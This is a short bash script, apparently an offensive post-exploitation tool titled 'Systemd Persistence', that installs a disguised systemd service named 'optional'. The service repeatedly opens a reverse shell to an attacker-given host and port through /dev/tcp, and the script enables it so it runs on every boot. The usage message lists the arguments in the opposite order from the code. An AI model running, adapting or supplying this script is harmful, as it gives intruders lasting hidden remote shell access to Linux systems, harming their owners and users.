#!/bin/bash

# Systemd Persistence       by 0bfxgh0st*

if [ $(id -u) != 0 ];
then
	printf "%s\n" "This script maybe fails if you don't have root rights"
fi

if [ -z $1 ] || [ -z $2 ];
then
	printf "%s\n" "Usage systemdp.sh <rport> <rhost>"
	exit
fi

printf "%s\n" "Systemd Persistence"
persistent_service_name="optional"
rhost=$1
rport=$2
payload="bash -c 'while true; do bash -i >& /dev/tcp/$rhost/$rport 0>&1;sleep 10;done'"
cat << EOF > /etc/systemd/system/$persistent_service_name.service
[Unit]
Description=optional service
[Service]
Type=oneshot
ExecStart=$payload
[Install]
WantedBy=multi-user.target
EOF
printf "Enabling service and making persistence on boot\n"
systemctl daemon-reload
systemctl enable $persistent_service_name.service
systemctl start $persistent_service_name.service 2>/dev/null &
